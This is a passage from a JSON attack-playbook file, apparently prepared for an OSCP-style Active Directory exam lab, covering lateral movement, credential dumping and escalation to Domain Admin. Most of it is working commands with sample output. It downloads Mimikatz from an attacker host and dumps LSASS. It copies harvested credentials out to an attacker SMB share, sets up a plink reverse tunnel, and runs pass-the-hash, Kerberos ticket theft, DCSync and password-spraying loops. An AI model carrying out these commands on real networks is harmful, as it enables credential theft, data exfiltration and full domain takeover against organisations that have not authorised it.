access):\n\nC:\\\\> whoami\nnt authority\\\\system\n\nC:\\\\> dir C:\\\\inetpub\\\\wwwroot\n(Web application root)\n\nC:\\\\> type C:\\\\inetpub\\\\wwwroot\\\\web.config\n(Find database connection strings, API keys)\n\nC:\\\\> dir /s /b C:\\\\inetpub\\\\*.config C:\\\\inetpub\\\\*.ini\n(Configuration files with credentials)\n\n(4) DOMAIN CONTROLLER (DC01 - Administrator access):\n\nC:\\\\> whoami\nnt authority\\\\system\n\nC:\\\\> dir \\\\\\\\localhost\\\\SYSVOL\\\\corp.com\n(Domain SYSVOL share)\n\nC:\\\\> dir \\\\\\\\localhost\\\\SYSVOL\\\\corp.com\\\\scripts\n(Logon scripts - often contain credentials)\n\nC:\\\\> type \\\\\\\\localhost\\\\SYSVOL\\\\corp.com\\\\Policies\\\\*.xml\n(Group Policy Preferences - may contain credentials)\n\nCREDENTIAL DUMPING (All systems):\n\nUpload Mimikatz:\nC:\\\\> curl http://<KALI_IP>:8000/mimikatz.exe -o C:\\\\Windows\\\\Temp\\\\m.exe\n\nDump LSASS:\nC:\\\\> C:\\\\Windows\\\\Temp\\\\m.exe privilege::debug sekurlsa::logonpasswords exit\n\nExpected output:\nAuthentication Id : 0 ; 123456\nSession           : Interactive from 1\nUser Name         : dave\nDomain            : CORP\nLogon Server      : DC01\nLogon Time        : 11/23/2025 10:00:00\nSID               : S-1-5-21-...\n  msv :\n   [00000003] Primary\n   * Username : dave\n   * Domain   : CORP\n   * NTLM     : a9b30e5b0dc865eadcea9411e4ade72d\n   * SHA1     : ...\n  tspkg :\n   * Username : dave\n   * Domain   : CORP\n   * Password : Welcome2023\n        ^^^^^^^^^^^^^^^^ PLAINTEXT PASSWORD EXTRACTED\n\nSave credentials:\nC:\\\\> C:\\\\Windows\\\\Temp\\\\m.exe privilege::debug sekurlsa::logonpasswords exit > C:\\\\Windows\\\\Temp\\\\creds.txt\n\nExfiltrate:\nKali: impacket-smbserver -smb2support share /home/kali/loot\nTarget: copy C:\\\\Windows\\\\Temp\\\\creds.txt \\\\\\\\<KALI_IP>\\\\share\\\n\nFILE EXFILTRATION:\n\nAccess C$ share from Kali:\nsmbclient //10.10.10.100/C$ -U 'corp.com/sqlsvc%SQLPass2023'\nsmb: \\\\> cd Users\\\\Administrator\\\\Desktop\nsmb: \\\\> get proof.txt\nsmb: \\\\> get local.txt\n\nMULTI-TARGET WORKFLOW:\n\nFrom pwned_access.txt:\n10.10.10.100 - sqlsvc (SQL01)\n10.10.10.105 - webadmin (WEB01)\n10.10.10.1 - Administrator (DC01)\n\nSequential access:\nfor target in \"10.10.10.100:sqlsvc:SQLPass2023\" \"10.10.10.105:webadmin:IIS2023Web!\" \"10.10.10.1:Administrator:Password123!\"; do\n  IP=$(echo $target | cut -d ':' -f 1)\n  USER=$(echo $target | cut -d ':' -f 2)\n  PASS=$(echo $target | cut -d ':' -f 3)\n  \n  echo \"[*] Accessing $IP as $USER\"\n  impacket-psexec \"corp.com/$USER:$PASS@$IP\" \"whoami && hostname && ipconfig\" >> recon_$IP.txt\ndone\n\nOPSEC IMPACT:\n\n- PSExec service creation = EventID 7045 (Service installed)\n- File write to ADMIN$ = EventID 5145 (Network share object accessed)\n- Process creation = EventID 4688 (PSEXESVC.exe)\n- LOUD technique - acceptable for exam, use with caution in real engagements\n\nFAILURE SCENARIOS:\n\n- Access denied despite (Pwn3d!): Windows Defender or EDR blocking PSEXESVC\n  \u2192 Alternative: Use wmiexec or smbexec instead\n\n- ADMIN$ share not writable: Share permissions restricted\n  \u2192 Alternative: Use atexec (scheduled tasks) or wmiexec\n\n- Service creation blocked: Antivirus or AppLocker policy\n  \u2192 Alternative: Use native Windows tools (PowerShell remoting, WinRM)\n\nTIME ESTIMATE: 5-10 minutes per target (shell access, initial recon, credential dumping).",
      "command_ref": "ad-pass-the-hash-impacket-psexec",
      "evidence": [
        "SYSTEM shell obtained on target systems",
        "whoami shows 'nt authority\\\\system'",
        "Credentials dumped from LSASS memory",
        "Sensitive files accessed and exfiltrated",
        "Proof.txt or local.txt retrieved from targets"
      ],
      "dependencies": [
        "validate-credentials-pth"
      ],
      "repeatable": true,
      "success_criteria": [
        "SYSTEM-level access obtained on at least one high-value target",
        "Additional credentials harvested from target systems",
        "Objective files accessed (flags, sensitive data)",
        "Lateral movement successful across multiple targets"
      ],
      "failure_conditions": [
        "PSExec blocked by AV/EDR (PSEXESVC.exe quarantined)",
        "ADMIN$ share access denied (despite Pwn3d! indicator)",
        "Service creation blocked (policy restriction)",
        "Shell hangs or becomes unresponsive (network issues)"
      ],
      "next_steps": [
        "pivot-and-escalate"
      ]
    },
    {
      "id": "pivot-and-escalate",
      "name": "Pivot to Additional Systems and Escalate Privileges",
      "objective": "Use compromised systems as pivot points to access additional targets and escalate to Domain Admin if not already achieved",
      "description": "PIVOTING STRATEGY: Use compromised systems as launching pads to reach previously inaccessible network segments or targets.\n\nPIVOT SCENARIO 1: Database Server as Pivot (SQL01 compromised)\n\nFrom SYSTEM shell on SQL01:\n\nC:\\\\> ipconfig /all\n(Identify additional network interfaces - may have access to internal DB network)\n\nC:\\\\> route print\n(View routing table - identify reachable subnets)\n\nC:\\\\> arp -a\n(Discover additional systems on local network)\n\nExample output:\nInterface: 10.10.10.100\nInternet Address      Physical Address\n10.10.10.101        00-0c-29-xx-xx-xx (SQL02 - replica server)\n10.10.10.102        00-0c-29-xx-xx-xx (APP01 - application server)\n10.10.10.50           00-0c-29-xx-xx-xx (INTERNAL_DB - internal network)\n\nC:\\\\> for /L %i in (1,1,254) do @ping -n 1 -w 100 10.10.10.%i | find \"Reply\" >> C:\\\\alive_hosts.txt\n(Sweep internal 10.10.10.0/24 subnet)\n\nC:\\\\> type C:\\\\alive_hosts.txt\nReply from 10.10.10.1\nReply from 10.10.10.50\nReply from 10.10.10.51\n\nPIVOT SCENARIO 2: Credentials Harvested for Lateral Movement\n\nFrom Mimikatz dump on SQL01:\n- Found: backupadmin:BackupPassword123! (plaintext password)\n- Found: fileadmin NTLM hash: 5f4dcc3b5aa765d61d8327deb882cf99\n\nTest new credentials against additional targets:\ncrackmapexec smb 10.10.10.110 -u backupadmin -p 'BackupPassword123!' -d corp.com\n[+] 10.10.10.110:445 FILE01 [+] corp.com\\\\backupadmin:BackupPassword123! (Pwn3d!)\n\nAccess FILE01:\nimpacket-psexec 'corp.com/backupadmin:BackupPassword123!@10.10.10.110'\n\nPIVOT SCENARIO 3: SSH Tunnel for Deep Network Access\n\nSetup SSH tunnel through SQL01:\n\nOn SQL01 (via PSExec shell):\nC:\\\\> curl http://<KALI_IP>:8000/plink.exe -o C:\\\\Windows\\\\Temp\\\\plink.exe\nC:\\\\> C:\\\\Windows\\\\Temp\\\\plink.exe -R 9050:127.0.0.1:9050 kali@<KALI_IP> -pw <KALI_PASS>\n(Reverse SOCKS5 tunnel)\n\nOn Kali:\nConfigure proxychains:\nEdit /etc/proxychains4.conf:\nsocks5 127.0.0.1 9050\n\nAccess internal network through tunnel:\nproxychains impacket-psexec 'corp.com/sqlsvc:SQLPass2023@10.10.10.50'\n\nPRIVILEGE ESCALATION TO DOMAIN ADMIN (If not already achieved):\n\nSCENARIO A: Domain Admin logged into compromised system\n\nFrom Mimikatz dump:\n- Found: corp\\\\DA_Admin (Domain Admin) logged into SQL01\n- NTLM hash: a9b30e5b0dc865eadcea9411e4ade72d\n\nUse immediately:\nimpacket-psexec -hashes :a9b30e5b0dc865eadcea9411e4ade72d 'corp.com/DA_Admin@10.10.10.1'\n(Access DC as Domain Admin)\n\nSCENARIO B: Kerberos Ticket Harvesting\n\nC:\\\\> C:\\\\Windows\\\\Temp\\\\m.exe privilege::debug sekurlsa::tickets /export\n(Export Kerberos TGT/TGS tickets from memory)\n\nC:\\\\> dir *.kirbi\n(Find Domain Admin tickets)\n\nExample: [0;3e7]-2-0-60a10000-DA_Admin@krbtgt-CORP.COM.kirbi\n\nTransfer to Kali and convert:\npython3 ticketConverter.py [ticket].kirbi DA_Admin.ccache\nexport KRB5CCNAME=DA_Admin.ccache\n\nUse ticket:\nimpacket-psexec -k -no-pass 'corp.com/DA_Admin@dc01.corp.com'\n\nSCENARIO C: Token Impersonation\n\nC:\\\\> C:\\\\Windows\\\\Temp\\\\m.exe privilege::debug token::elevate\n(Impersonate SYSTEM token)\n\nC:\\\\> C:\\\\Windows\\\\Temp\\\\m.exe token::list /user:Administrator\n(List available tokens for Administrator)\n\nC:\\\\> C:\\\\Windows\\\\Temp\\\\m.exe token::elevate /domainadmin\n(Impersonate Domain Admin token if available)\n\nSCENARIO D: DCSync from Compromised System (If DA access)\n\nIf Domain Admin obtained:\nimpacket-secretsdump 'corp.com/DA_Admin:Password123!@10.10.10.1' -just-dc-ntlm -outputfile full_domain_dump\n\n(Now have ALL domain credentials - full compromise)\n\nADDITIONAL LATERAL MOVEMENT OPPORTUNITIES:\n\n(1) PASSWORD REUSE:\nTest harvested passwords against all systems:\nfor pass in \"SQLPass2023\" \"BackupPassword123!\" \"IIS2023Web!\"; do\n  crackmapexec smb 10.10.10.0/24 -u administrator -p \"$pass\" -d corp.com\ndone\n\n(2) SERVICE ACCOUNT PIVOTING:\nService accounts often admin on multiple servers:\ncrackmapexec smb 10.10.10.0/24 -u sqlsvc -p 'SQLPass2023' -d corp.com\n(Find all systems where sqlsvc has admin rights)\n\n(3) CACHED CREDENTIALS:\nOn each compromised system:\nreg query \"HKLM\\\\SECURITY\\\\Cache\" /s\n(Extract cached domain credentials - requires SYSTEM)\n\nDOCUMENT PRIVILEGE ESCALATION PATH:\n\nCreate escalation chain documentation:\n\n1. Initial Access: dave (standard user) - AS-REP roasting\n2. DCSync Rights: dave (Domain User with replication rights)\n3. Targeted DCSync: sqlsvc, webadmin, backup_admin credentials extracted\n4. Lateral Movement: SQL01 compromised via sqlsvc PSExec\n5. Credential Harvesting: DA_Admin NTLM hash from SQL01 LSASS memory\n6. Privilege Escalation: DA_Admin PTH to DC01\n7. Domain Compromise: Full DCSync as Domain Admin\n\nSave to: privilege_escalation_chain.md\n\nOBJECTIVE COMPLETION:\n\nOnce Domain Admin achieved:\n- Access ANY domain resource\n- Extract ALL domain credentials (full DCSync)\n- Create Golden Ticket for persistence\n- Access all flags/objectives\n- Complete security assessment requirements\n\nEVIDENCE COLLECTION:\n\nScreenshots:\n- PSExec SYSTEM shells (whoami showing nt authority\\\\system)\n- Mimikatz credential dumps (showing plaintext passwords/hashes)\n- Domain Admin access to DC (proof.txt from DC)\n- Privilege escalation chain (visual diagram or markdown)\n\nFAILURE SCENARIOS:\n\n- No Domain Admin logged into any compromised system\n  \u2192 Try: (1) Wait for DA logon (monitor sessions), (2) Kerberoast remaining SPNs, (3) Local privilege escalation to SYSTEM, then token impersonation\n\n- Cannot pivot to internal networks\n  \u2192 Alternative: (1) VPN credentials in files, (2) SSH keys, (3) RDP saved credentials\n\n- Token impersonation fails\n  \u2192 Requires: (1) SYSTEM privileges, (2) Domain Admin actively logged in, (3) SeImpersonatePrivilege enabled\n\nTIME ESTIMATE: 10-20 minutes (depends on privilege escalation complexity).",
      "command_ref": "ad-pass-the-hash-impacket-psexec",
      "evidence": [
        "Additional systems discovered via pivoting",
        "New credentials harvested from compromised systems",
        "Domain Admin access achieved (if applicable)",
        "privilege_escalation_chain.md documented",
        "Full domain compromise confirmed (if DA obtained)",
        "All exam objectives accessible"
      ],
      "dependencies": [
        "lateral-movement-psexec"
      ],
      "repeatable": true,
      "success_criteria": [
        "At least one additional system accessed via pivoting",
        "New credentials harvested from target systems",
        "Privilege escalation path documented",
        "Domain Admin access achieved OR objective completed with current privileges"
      ],
      "failure_conditions": [
        "No additional systems reachable from pivots (network segmentation)",
        "No Domain Admin credentials found (may need alternative escalation path)",
        "Token impersonation fails (no DA sessions available)",
        "Pivoting tools blocked (AV/EDR prevention)"
      ],
      "next_steps": []
    }
  ]
}